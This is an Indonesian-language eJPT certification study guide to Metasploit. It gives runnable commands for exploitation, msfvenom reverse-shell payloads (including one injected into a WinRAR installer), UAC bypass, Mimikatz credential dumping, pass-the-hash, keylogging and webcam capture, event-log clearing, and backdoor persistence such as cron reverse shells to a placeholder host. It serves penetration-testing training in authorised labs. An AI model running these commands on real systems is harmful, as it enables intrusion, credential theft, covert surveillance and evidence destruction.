# eJPT — The Metasploit Framework (MSF)
### Host & Network Penetration Testing

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin.

---

## Daftar Isi

1. [Introduction to Metasploit](#1-introduction-to-metasploit)
2. [Metasploit Architecture](#2-metasploit-architecture)
3. [Msfconsole Basics](#3-msfconsole-basics)
4. [Information Gathering & Enumeration](#4-information-gathering--enumeration)
5. [Vulnerability Scanning](#5-vulnerability-scanning)
6. [Client-Side Attacks](#6-client-side-attacks)
7. [Exploitation](#7-exploitation)
8. [Post-Exploitation](#8-post-exploitation)
   - [Post Exploitation Fundamentals](#81-post-exploitation-fundamentals)
   - [Windows Post Exploitation](#82-windows-post-exploitation)
   - [Linux Post Exploitation](#83-linux-post-exploitation)
9. [Payloads & Msfvenom](#9-payloads--msfvenom)
10. [Armitage](#10-armitage)

---

## 1. Introduction to Metasploit

### Apa itu Metasploit?

Metasploit Framework (MSF) adalah platform open-source untuk pengembangan dan eksekusi exploit terhadap target yang rentan. Dikembangkan oleh Rapid7, MSF adalah tool paling populer di dunia penetration testing.

### Kegunaan MSF dalam Pentest

| Fase Pentest | Kegunaan MSF |
|---|---|
| Reconnaissance | Port scan, service enumeration via auxiliary |
| Scanning | Vulnerability scanning dengan auxiliary scanner |
| Exploitation | Eksploitasi kerentanan dengan exploit modules |
| Post-Exploitation | Meterpreter: privilege escalation, pivoting, dll |
| Reporting | Database untuk menyimpan hasil |

### Edisi Metasploit

- **Metasploit Framework** → open-source, CLI, yang digunakan di eJPT
- **Metasploit Pro** → komersial, GUI lengkap, fitur tambahan

### Lokasi Penting di Kali Linux

```
/usr/share/metasploit-framework/        → direktori utama MSF
/usr/share/metasploit-framework/modules → semua modules
/usr/share/metasploit-framework/plugins → plugins
~/.msf4/                                → konfigurasi user
~/.msf4/loot/                           → hasil loot
~/.msf4/logs/                           → log
```

---

## 2. Metasploit Architecture

### Struktur Module

```
modules/
├── auxiliary/      → scanning, enumeration, fuzzing, sniffing
├── exploits/       → kode eksploitasi kerentanan
├── payloads/       → kode yang dieksekusi setelah exploit berhasil
├── post/           → post-exploitation (setelah dapat akses)
├── encoders/       → enkode payload agar bypass AV
├── evasion/        → bypass antivirus/EDR
└── nops/           → NOP sled untuk buffer overflow
```

### Jenis Module

**Auxiliary** — tidak mengeksploitasi, digunakan untuk:
- Scanner (port, service, vulnerability)
- Fuzzer
- Sniffer
- Brute forcer

**Exploit** — kode untuk mengeksploitasi kerentanan spesifik. Selalu digunakan bersama payload.

**Payload** — kode yang dijalankan di sistem target setelah exploit berhasil.

**Post** — digunakan setelah mendapat sesi, untuk:
- Privilege escalation
- Credential harvesting
- Pivoting
- Persistence

**Encoder** — mengenkode payload untuk menghindari deteksi signature-based AV.

**Evasion** — teknik bypass AV yang lebih canggih dari encoder.

### Jenis Payload

```
Singles (Inline)
  → payload lengkap dalam satu paket
  → contoh: windows/shell_reverse_tcp
  → tidak butuh stage kedua
  → lebih stabil, ukuran lebih besar

Staged
  → dikirim dalam dua tahap:
     Stage 1: stager kecil → buka koneksi ke attacker
     Stage 2: stage besar (Meterpreter) → dikirim via koneksi itu
  → contoh: windows/meterpreter/reverse_tcp
  → ukuran stage 1 kecil (bypass size restriction)
  → lebih powerful

Cara beda Single vs Staged di nama:
  windows/shell_reverse_tcp       → single (underscore setelah shell)
  windows/shell/reverse_tcp       → staged (slash setelah shell)
  windows/meterpreter_reverse_tcp → single meterpreter
  windows/meterpreter/reverse_tcp → staged meterpreter
```

### Payload Types

| Payload | Keterangan |
|---|---|
| `shell_bind_tcp` | Buka port di target, attacker connect ke sana |
| `shell_reverse_tcp` | Target connect balik ke attacker |
| `meterpreter/reverse_tcp` | Meterpreter staged, reverse connection |
| `meterpreter/bind_tcp` | Meterpreter staged, bind connection |
| `meterpreter_reverse_https` | Meterpreter via HTTPS (bypass firewall) |

**Reverse vs Bind:**
- **Reverse** → target konek ke attacker (lebih sering digunakan, bypass firewall lebih mudah)
- **Bind** → attacker konek ke target (butuh port target accessible)

---

## 3. Msfconsole Basics

### Menjalankan Metasploit

```bash
# Start PostgreSQL database (untuk menyimpan hasil)
service postgresql start

# Inisialisasi database MSF (pertama kali)
msfdb init

# Jalankan msfconsole
msfconsole
msfconsole -q    # tanpa banner
```

### Perintah Dasar msfconsole

```bash
# ─── NAVIGASI ────────────────────────────────────────────

help                    # tampilkan semua perintah
?                       # sama dengan help

search <keyword>        # cari module
search type:exploit platform:windows smb
search cve:2017-0144    # cari berdasarkan CVE
search name:eternalblue

use <module_path>       # pilih module
use exploit/windows/smb/ms17_010_eternalblue
use 0                   # gunakan nomor hasil search

info                    # info detail module yang dipilih
back                    # keluar dari module saat ini
previous                # kembali ke module sebelumnya

# ─── OPTIONS ─────────────────────────────────────────────

show options            # tampilkan opsi module
show advanced           # opsi advanced
show payloads           # payload yang kompatibel
show targets            # target OS yang didukung
show missing            # opsi yang belum diisi (wajib diisi)

set RHOSTS 192.168.1.10         # set target IP
set RHOSTS 192.168.1.0/24       # set subnet
set RPORT 445                    # set port target
set LHOST 192.168.1.5            # set IP attacker (untuk reverse)
set LPORT 4444                   # set port listener
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0                     # set target index

unset RHOSTS                     # hapus nilai option
unset all                        # hapus semua nilai

setg LHOST 192.168.1.5           # set global (berlaku untuk semua module)
setg RHOSTS 192.168.1.10
unsetg LHOST                     # hapus global option

# ─── EKSEKUSI ────────────────────────────────────────────

run                     # jalankan module
exploit                 # sama dengan run
run -j                  # jalankan sebagai background job
exploit -z              # exploit dan langsung background session
check                   # cek apakah target vulnerable (jika didukung)

# ─── SESSIONS ────────────────────────────────────────────

sessions                # list semua sesi aktif
sessions -l             # sama dengan sessions
sessions -i 1           # interact dengan sesi nomor 1
sessions -k 1           # kill sesi nomor 1
sessions -k all         # kill semua sesi
sessions -u 1           # upgrade shell ke meterpreter

# ─── JOBS ────────────────────────────────────────────────

jobs                    # list background jobs
jobs -l                 # sama dengan jobs
jobs -k 1               # kill job nomor 1

# ─── DATABASE ────────────────────────────────────────────

db_status               # cek koneksi database
workspace               # lihat workspace saat ini
workspace -a pentest1   # buat workspace baru
workspace pentest1      # pindah ke workspace

hosts                   # tampilkan host yang ditemukan
services                # tampilkan service yang ditemukan
vulns                   # tampilkan kerentanan yang ditemukan
creds                   # tampilkan credentials yang ditemukan
loot                    # tampilkan loot yang dikumpulkan
notes                   # tampilkan catatan

db_nmap -sV TARGET_IP   # nmap langsung ke database MSF

# ─── LAINNYA ─────────────────────────────────────────────

save                    # simpan konfigurasi
reload_all              # reload semua modules
version                 # versi MSF
history                 # riwayat perintah
exit / quit             # keluar dari msfconsole

# Shell command langsung dari msfconsole
!whoami
!ls /tmp
shell                   # akses OS shell dari msfconsole
```

### Resource Scripts

Resource script adalah file yang berisi perintah msfconsole yang dieksekusi otomatis.

```bash
# Jalankan resource script
msfconsole -r /path/to/script.rc

# Dari dalam msfconsole
resource /path/to/script.rc

# Simpan perintah saat ini sebagai resource script
makerc /path/to/output.rc

# Contoh isi resource script (setup_handler.rc):
# use multi/handler
# set PAYLOAD windows/meterpreter/reverse_tcp
# set LHOST 192.168.1.5
# set LPORT 4444
# run -j
```

---

## 4. Information Gathering & Enumeration

### Port Scanning dengan MSF

```bash
# TCP port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 10
run

# SYN scanner (butuh root)
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-65535
run

# UDP scanner
use auxiliary/scanner/portscan/udp
set RHOSTS 192.168.1.10
run

# Lebih efisien: gunakan db_nmap
db_nmap -sV -sC -O TARGET_IP
```

### Service Enumeration

```bash
# ─── FTP ──────────────────────────────────────────────────

use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run

# ─── SMB ──────────────────────────────────────────────────

use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run

# ─── SSH ──────────────────────────────────────────────────

use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

# ─── HTTP ─────────────────────────────────────────────────

use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/robots_txt
set RHOSTS TARGET_IP
run

# ─── SMTP ─────────────────────────────────────────────────

use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS TARGET_IP
set USER_FILE /path/to/users.txt
run

# ─── MYSQL ────────────────────────────────────────────────

use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## 5. Vulnerability Scanning

### MSF sebagai Vulnerability Scanner

```bash
# Scan kerentanan SMB
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run

# Exploit EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
run
```

### Integrasi dengan Nmap & Nessus

```bash
# Import hasil nmap XML ke MSF database
db_import /path/to/nmap_output.xml

# Import hasil Nessus
db_import /path/to/nessus_output.nessus

# Lihat hasil import
hosts
services
vulns
```

### Vulnerability Scanning dengan WMAP

```bash
# 1. Setup workspace
workspace -a Web_scanning

# 2. Load Wmap
load wmap

# 3. Atur target
wmap_sites -a <IP_TARGET>
wmap_target -t http://<TARGET>/

# 4. Running
wmap_run -t
```

---

## 6. Client-Side Attacks

### Konsep Client-Side Attacks

Client-side attacks menargetkan **aplikasi di sisi client** (browser, Office, PDF reader) bukan server. Target harus **membuka file atau mengklik link** yang berbahaya.

### Generating Payloads With Msfvenom

```bash
# Windows x64
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx64.exe

# Windows x86
msfvenom -a x86 -p windows/x86/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=1234 -f exe > payloadx86.exe

# Linux x64
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx64

# Linux x86
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f elf > payloadx86
```

### Encoding Payloads with Msfvenom

```bash
# List encoder
msfvenom --list encoders

# Encode dengan shikata_ga_nai (iterasi 10)
# Windows
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -i 10 -e x86/shikata_ga_nai -f exe > encodingx86.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -i 10 -e x86/shikata_ga_nai -f elf > encodingx86
```

### Injecting Payloads Into Windows Portable Executables

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -i 10 -x ~/Downloads/wrar602.exe \
  -e x86/shikata_ga_nai -f exe > winrar.exe
```

### Automating Metasploit With Resource Scripts

```bash
# Buat file handler.rc
nano handler.rc

# Isi file:
# use multi/handler
# set payload windows/meterpreter/reverse_tcp
# set LHOST ATTACKER_IP
# set LPORT 4444
# run

# Jalankan
msfconsole -r handler.rc
```

---

## 7. Exploitation

### Workflow Eksploitasi

```
1. Identifikasi service & versi (nmap/auxiliary scanner)
2. Cari exploit yang sesuai (search di MSF)
3. Pilih exploit (use)
4. Cek kompatibilitas target (show targets, check)
5. Set options (RHOSTS, LHOST, LPORT, PAYLOAD)
6. Run exploit
7. Interact dengan sesi yang didapat
```

### Exploit Windows

```bash
# ─── HTTP File Server Rejetto ──────────────────────────────

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run

# ─── MS17-010 EternalBlue (Windows 7/Server 2008) ──────────

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run

# ─── WinRM ─────────────────────────────────────────────────

use auxiliary/scanner/winrm/winrm_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

use exploit/windows/winrm/winrm_script_exec
set USERNAME <user_valid>
set PASSWORD <pass_valid>
run

# ─── Tomcat ────────────────────────────────────────────────

use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS TARGET_IP
run

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_IP
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST ATTACKER_IP
run
```

### Exploit Linux

```bash
# ─── VSFTPD 2.3.4 Backdoor ─────────────────────────────────

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run

# ─── Samba ─────────────────────────────────────────────────

use exploit/linux/samba/is_known_pipename
set RHOSTS TARGET_IP
run

# Upgrade ke Meterpreter
use post/multi/manage/shell_to_meterpreter

# ─── SSH ───────────────────────────────────────────────────

use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS TARGET_IP
set SPAWN_PTY true
run

# ─── SMTP Haraka ───────────────────────────────────────────

use exploit/linux/smtp/haraka
set RHOST TARGET_IP
set SRVPORT 9898
set email_to root@attackdefense.test
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST ATTACKER_IP
run
```

---

## 8. Post-Exploitation

---

### 8.1 Post Exploitation Fundamentals

---

#### Meterpreter Fundamentals

Meterpreter adalah payload advanced yang berjalan **di memory** (tidak menulis ke disk), menggunakan **encrypted communication**, dan sangat sulit dideteksi AV.

```bash
# ─── SYSTEM INFO ─────────────────────────────────────────

sysinfo                 # info sistem (OS, hostname, arch)
getuid                  # user saat ini
getpid                  # process ID meterpreter
ps                      # list semua proses
pwd                     # direktori saat ini
ls                      # list file

# ─── NAVIGASI FILE ───────────────────────────────────────

cd /tmp
ls
cat /etc/passwd
download /etc/passwd /tmp/passwd_local
upload /tmp/tool.exe C:\\Windows\\Temp\\
edit /tmp/file.txt
mkdir /tmp/newdir
rm /tmp/file.txt
search -f "*.txt"
search -f "password*" -d C:\\Users\\

# ─── SHELL ───────────────────────────────────────────────

shell                   # akses shell OS biasa
# Keluar dari shell kembali ke meterpreter: Ctrl+Z atau exit

# ─── BACKGROUND / MANAGE SESSIONS ────────────────────────

background              # background session (Ctrl+Z)
sessions -l             # list sessions
sessions -i 1           # kembali ke session 1
sessions -u 1           # upgrade shell ke meterpreter

# ─── NETWORK ─────────────────────────────────────────────

ipconfig / ifconfig     # network interfaces
arp                     # ARP table
netstat                 # koneksi aktif
route                   # routing table
```

---

#### Upgrading Command Shells To Meterpreter Shells

Ketika exploit hanya menghasilkan shell biasa (bukan Meterpreter), shell tersebut bisa di-upgrade.

```bash
# Cara 1 — Dari msfconsole (paling mudah)
sessions -u <session_id>
# MSF otomatis upgrade shell biasa ke Meterpreter

# Cara 2 — Post module
use post/multi/manage/shell_to_meterpreter
set SESSION <session_id>
run

# Cara 3 — Dari dalam shell biasa
# Generate payload Meterpreter baru dengan msfvenom
# Upload dan eksekusi di target
# Tangkap dengan multi/handler

# Verifikasi setelah upgrade
sessions -l
# Meterpreter type akan berubah dari 'shell' ke 'meterpreter'
```

**Kenapa perlu upgrade?**

| Shell Biasa | Meterpreter |
|---|---|
| Fitur terbatas | Fitur lengkap |
| Tidak encrypted | Encrypted |
| Mudah terdeteksi | Sulit terdeteksi |
| Tidak stabil | Lebih stabil |
| Tidak bisa pivoting | Bisa pivoting, port forward |

---

### 8.2 Windows Post Exploitation

---

#### Windows Post Exploitation Modules

```bash
# Migrate sistem
use post/windows/gather/win_privs
set SESSION <id>
run

# Windows Priv Enumeration
use post/windows/manage/migrate
set SESSION <id>
run

# Enumerate logged on users
use post/windows/gather/enum_logged_on_users
set SESSION <id>
run

# Enumerasi sistem
use post/windows/gather/enum_system
set SESSION <id>
run

# Enumerate installed software
use post/windows/gather/enum_applications
set SESSION <id>
run

# Enumerate installed AV
use post/windows/gather/enum_computers
set SESSION <id>
run

# Enumerate komputer
use post/windows/gather/enum_av_excluded
set SESSION <id>
run

# Enumerate patches
use post/windows/gather/enum_patches
set SESSION <id>
run

# Collect credentials
use post/windows/gather/credentials/credential_collector
set SESSION <id>
run

# Local exploit suggester — cari celah PrivEsc
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Network enumeration dari dalam target
use post/multi/gather/ping_sweep
set RHOSTS 192.168.2.0/24
set SESSION <id>
run
```

---

#### Windows Privilege Escalation: Bypassing UAC

UAC (User Account Control) membatasi akses meskipun user adalah Administrator. UAC Bypass diperlukan untuk naik dari **Medium Integrity** ke **High Integrity**.

```bash
# Syarat: sudah dapat Meterpreter sebagai user Administrator
# Pastikan arsitektur x64 (migrate ke explorer dulu)

# 1. Cek posisi saat ini
meterpreter > getuid
meterpreter > sysinfo

# 2. Migrate ke explorer.exe (x64 + token sesi user)
meterpreter > pgrep explorer
meterpreter > migrate <PID>

# 3. Background sesi
meterpreter > background

# 4. Load UAC bypass module
use exploit/windows/local/bypassuac_eventvwr   # Win 7/2008/2012
# atau
use exploit/windows/local/bypassuac_fodhelper  # Win 10

# 5. Set session dan payload
set SESSION <id>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_KALI>
run

# 6. Di sesi baru — eskalasi ke SYSTEM
meterpreter > getsystem
meterpreter > getuid
# NT AUTHORITY\SYSTEM ✓
```

**UACMe (manual method):**

```bash
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP> LPORT=4444 -f exe -o backdoor.exe

# Upload Akagi64.exe + backdoor.exe
meterpreter > upload Akagi64.exe C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter > upload backdoor.exe C:\\Users\\admin\\AppData\\Local\\Temp

# Jalankan UACMe
meterpreter > shell
C:\> C:\Users\admin\AppData\Local\Temp\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

# Nomor metode UACMe:
# 23 → eventvwr.exe  (Win 7/2008/2012) ← paling sering di eJPT
# 30 → fodhelper.exe (Win 10)
# 33 → diskcleanup   (Win 10)
```

---

#### Windows Privilege Escalation: Token Impersonation With Incognito

Token Impersonation memanfaatkan `SeImpersonatePrivilege` untuk mencuri token milik proses SYSTEM.

```bash
# Syarat: cek privilege dulu
meterpreter > getprivs
# Harus ada: SeImpersonatePrivilege

# 1. Load modul incognito
meterpreter > load incognito

# 2. List token yang tersedia
meterpreter > list_tokens -u

# 3. Impersonate token SYSTEM
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# 4. Verifikasi
meterpreter > getuid
# NT AUTHORITY\SYSTEM ✓

# 5. Kalau privilege masih terbatas
meterpreter > getsystem
```

**Potato Attacks** (jika `SeImpersonatePrivilege` tersedia):

| Tool | Target OS |
|---|---|
| JuicyPotato | Windows 7–10 / 2008–2016 |
| PrintSpoofer | Windows 10 / 2019 |
| RoguePotato | Windows 10 / 2019 |

```bash
# JuicyPotato manual
meterpreter > upload JuicyPotato.exe C:\\Temp
meterpreter > upload backdoor.exe C:\\Temp
C:\Temp> JuicyPotato.exe -l 4445 -p backdoor.exe -t * -c <CLSID>
```

---

#### Dumping Hashes With Mimikatz

```bash
# Syarat: NT AUTHORITY\SYSTEM
meterpreter > getsystem
meterpreter > getuid

# Load Kiwi (Mimikatz)
meterpreter > load kiwi

# Dump semua credentials
meterpreter > creds_all

# Dump dari SAM
meterpreter > lsa_dump_sam

# Dump LSA secrets
meterpreter > lsa_dump_secrets

# Kalau creds_all kosong → migrate ke lsass dulu
meterpreter > pgrep lsass
meterpreter > migrate <PID>
meterpreter > creds_all
```

**Contoh output:**

```
Username      : Administrator
Domain        : ATTACKDEFENSE
NTLM          : e3c61a68f1b89ee6c8ba9507378dc88d
SHA1          : fa62275e30d286c09d30d8fece82664eb34323ef
Password      : (null)
```

---

#### Pass-the-Hash With PSExec

Menggunakan NTLM hash langsung untuk autentikasi tanpa perlu password plaintext.

```bash
# Cara 1 — PSExec Impacket
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d \
  Administrator@<IP>

# Shortcut kalau LM kosong
python3 psexec.py -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@<IP>

# Cara 2 — Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS <IP>
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Cara 3 — CrackMapExec
crackmapexec smb <IP> -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
crackmapexec smb <IP> -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "whoami"
```

---

#### Establishing Persistence On Windows

Persistence memastikan akses tetap ada meskipun sistem di-restart atau sesi terputus.

```bash
# Cara 1 — Persistence via registry (Metasploit module)
use post/windows/manage/persistence_exe
set SESSION <id>
set STARTUP REGISTRY        # atau SCHEDULER / SERVICE
set PAYLOAD_FILE backdoor.exe
run

# Cara 2 — Buat user baru (manual)
meterpreter > shell
C:\> net user hacker Password123! /add
C:\> net localgroup administrators hacker /add

# Cara 3 — Scheduled task
C:\> schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\backdoor.exe" /sc onstart /ru SYSTEM

# Cara 4 — Registry Run key
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
     /v WindowsUpdate /t REG_SZ /d "C:\Temp\backdoor.exe"
```

---

#### Enabling RDP

RDP (Remote Desktop Protocol) memungkinkan akses GUI ke sistem Windows.

```bash
# Cara 1 — Metasploit module
use post/windows/manage/enable_rdp
set SESSION <id>
run

# Cara 2 — Manual dari shell
meterpreter > shell

# Enable RDP
C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" \
     /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow di firewall
C:\> netsh advfirewall firewall add rule name="RDP" \
     protocol=TCP dir=in localport=3389 action=allow

# Tambah user untuk RDP
C:\> net localgroup "Remote Desktop Users" hacker /add

# Koneksi dari Kali
xfreerdp /u:Administrator /p:Password123 /v:<IP_TARGET>
xfreerdp /u:hacker /p:Password123! /v:<IP_TARGET>
```

---

#### Windows Keylogging

```bash
# Mulai keylogger
meterpreter > keyscan_start

# Dump hasil keylogger
meterpreter > keyscan_dump

# Hentikan keylogger
meterpreter > keyscan_stop

# Screenshot desktop
meterpreter > screenshot

# Webcam
meterpreter > webcam_list
meterpreter > webcam_snap

# Rekam microphone (10 detik)
meterpreter > record_mic -d 10
```

---

#### Clearing Windows Event Logs

Menghapus log untuk menghilangkan jejak aktivitas.

```bash
# Cara 1 — Meterpreter built-in
meterpreter > clearev

# Cara 2 — Manual dari shell
meterpreter > shell

# Hapus semua event log
C:\> wevtutil cl System
C:\> wevtutil cl Security
C:\> wevtutil cl Application

# List semua log yang tersedia
C:\> wevtutil el

# Cara 3 — PowerShell
C:\> powershell -c "Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }"
```

> ⚠️ **Catatan**: Di exam eJPT, clearing logs biasanya tidak diperlukan. Di real engagement, selalu sesuaikan dengan scope yang disepakati.

---

#### Pivoting

Pivoting memungkinkan akses ke jaringan internal yang tidak dapat diakses langsung dari Kali.

```bash
# Syarat: sudah dapat Meterpreter di mesin yang terhubung ke dua jaringan

# 1. Cek interface jaringan di target
meterpreter > ipconfig
# Temukan subnet internal: misal 192.168.2.0/24

# 2. Tambahkan route ke subnet internal
meterpreter > run post/multi/manage/autoroute SUBNET=192.168.2.0/24
# atau
meterpreter > run autoroute -s 192.168.2.0/24
meterpreter > run autoroute -p    # verifikasi route

# 3. Background sesi
meterpreter > background

# 4. Scan subnet internal via route
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 22,80,445,3389
run

# 5. Setup SOCKS proxy untuk tools lain (Proxychains)
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run -j

# Edit /etc/proxychains4.conf
# socks5 127.0.0.1 9050

# Gunakan tools via proxychains
proxychains nmap -sT -Pn 192.168.2.10
proxychains psexec.py Administrator@192.168.2.10

# 6. Port Forwarding
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.2.10
# Akses 192.168.2.10:80 via localhost:8080
meterpreter > portfwd list
meterpreter > portfwd delete -l 8080
```

---

### 8.3 Linux Post Exploitation

---

#### Linux Post Exploitation Modules

```bash
# Enumerasi sistem
use post/linux/gather/enum_system
set SESSION <id>
run

# Enumerate network
use post/linux/gather/enum_network
set SESSION <id>
run

# Enumerate user history
use post/linux/gather/enum_users_history
set SESSION <id>
run

# Gather configs
use post/linux/gather/enum_configs
set SESSION <id>
run

# Local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Network ping sweep dari target
use post/multi/gather/ping_sweep
set RHOSTS 10.10.10.0/24
set SESSION <id>
run
```

---

#### Linux Privilege Escalation: Exploiting A Vulnerable Program

```bash
# 1. Cek SUID binaries
meterpreter > shell
$ find / -perm -u=s -type f 2>/dev/null

# 2. Cek sudo permissions
$ sudo -l

# 3. Cek cronjobs
$ cat /etc/crontab
$ ls -la /etc/cron.*

# 4. Local exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Eksploitasi SUID binary
# Referensi: https://gtfobins.github.io

# Contoh: bash dengan SUID
$ bash -p
# bash-5.0# (root!)

# Contoh: find dengan SUID
$ find . -exec /bin/bash -p \; -quit

# Contoh: vim dengan SUID
$ vim -c ':!/bin/bash -p'

# Cronjob exploitation
# Cek file yang dieksekusi cronjob
$ ls -la /path/to/cronjob_script.sh
# Kalau writable:
$ echo "bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1" >> /path/to/cronjob_script.sh
# Setup listener di Kali: nc -lvnp 4444
# Tunggu cronjob jalan → dapat root shell
```

---

#### Dumping Hashes With Hashdump

```bash
# Cara 1 — Meterpreter hashdump (butuh root)
meterpreter > hashdump

# Cara 2 — Post module
use post/linux/gather/hashdump
set SESSION <id>
run

# Cara 3 — Manual dari shell (butuh root)
$ cat /etc/shadow

# Format shadow file:
# username:$type$salt$hash:lastchange:min:max:warn:inactive:expire
# $1$ = MD5
# $6$ = SHA-512 ← paling umum di Linux modern

# Crack hash Linux dengan John
$ unshadow /etc/passwd /etc/shadow > hashes.txt
$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack dengan hashcat
$ hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512
$ hashcat -m 500  hashes.txt /usr/share/wordlists/rockyou.txt  # MD5
```

---

#### Establishing Persistence On Linux

```bash
# Cara 1 — Post module (paling mudah)
use post/linux/manage/sshkey_persistence
set SESSION <id>
run
# Membuat SSH key dan menambahkan ke authorized_keys

# Cara 2 — Tambah user baru (manual)
meterpreter > shell
$ useradd -m -s /bin/bash hacker
$ echo "hacker:Password123" | chpasswd
$ usermod -aG sudo hacker      # Debian/Ubuntu
$ usermod -aG wheel hacker     # CentOS/RHEL

# Cara 3 — SSH backdoor (pasang public key)
$ mkdir -p /root/.ssh
$ echo "<PUBLIC_KEY>" >> /root/.ssh/authorized_keys
$ chmod 600 /root/.ssh/authorized_keys

# Koneksi dari Kali:
$ ssh -i id_rsa root@<IP_TARGET>

# Cara 4 — Cron persistence
$ (crontab -l; echo "* * * * * bash -i >& /dev/tcp/<IP>/4444 0>&1") | crontab -
```

---

## 9. Payloads & Msfvenom

### Msfvenom Overview

Msfvenom menggabungkan `msfpayload` dan `msfencode` menjadi satu tool untuk generate dan enkode payload.

### Sintaks Dasar

```bash
msfvenom -p <PAYLOAD> [OPTIONS] -f <FORMAT> -o <OUTPUT_FILE>

# Parameter penting:
# -p  : payload yang digunakan
# -l  : list payload/format/encoder
# -f  : format output
# -o  : file output
# -e  : encoder
# -i  : jumlah iterasi encoding
# -b  : bad characters (untuk buffer overflow)
# -x  : template executable
# -k  : keep template behavior
# LHOST, LPORT : untuk reverse payload
```

### Generate Payload per Platform

```bash
# ─── WINDOWS ───────────────────────────────────────────────

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f exe -o win_payload.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f exe -o win64_payload.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f dll -o payload.dll

# ASP / ASPX (web shell Windows IIS)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f asp -o shell.asp

msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx

# ─── LINUX ─────────────────────────────────────────────────

msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f elf -o linux_payload

